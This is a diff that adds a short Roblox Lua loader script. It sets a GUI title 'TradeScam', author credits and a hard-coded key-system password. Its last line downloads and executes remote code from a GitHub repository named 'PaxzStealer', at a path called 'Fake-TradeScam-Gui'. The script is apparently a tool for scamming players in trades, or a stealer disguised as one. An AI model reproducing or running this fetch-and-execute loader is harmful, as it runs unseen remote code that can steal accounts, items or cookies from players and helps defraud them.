@@ -1,0 +1,11 @@
+_G.ScriptTitle = "TradeScam" --// The title of your Gui
+_G.ScriptCredits = "Made by vince" --// put here something like made by (your name)
+
+-- Key System Settings --
+_G.KeySystem = true --// set to true for keysystem (if not dont touch anything from the Key System)
+_G.TitleKeySystem = "Bedz Key system" --// Title for your keysystem
+_G.Key = "Vincelot" --// the key for your key system
+_G.KeySystemNote = "KEY SYSTEM IS FOR MODERATIONS ONLY!" --// Note for your key system
+
+-- {Script} --
+loadstring(game:HttpGet("https://raw.githubusercontent.com/PaxzStealer/Paxz/main/Paxz-Fake-TradeScam-Gui", true))()
